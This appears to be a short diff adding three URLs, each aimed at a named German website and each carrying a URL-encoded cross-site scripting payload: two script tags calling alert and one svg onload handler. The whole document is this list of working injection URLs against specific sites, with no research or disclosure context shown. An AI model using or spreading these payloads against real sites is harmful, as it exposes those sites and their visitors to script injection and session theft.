@@ -1,0 +1,3 @@
+http://falken4you.de/index.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E?page=HOME
+http://faltcaravans.de/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x
+https://fakt.tlah-crew.de/addons/?q=%3Csvg%2Fonload%3Dalert(1)%3E
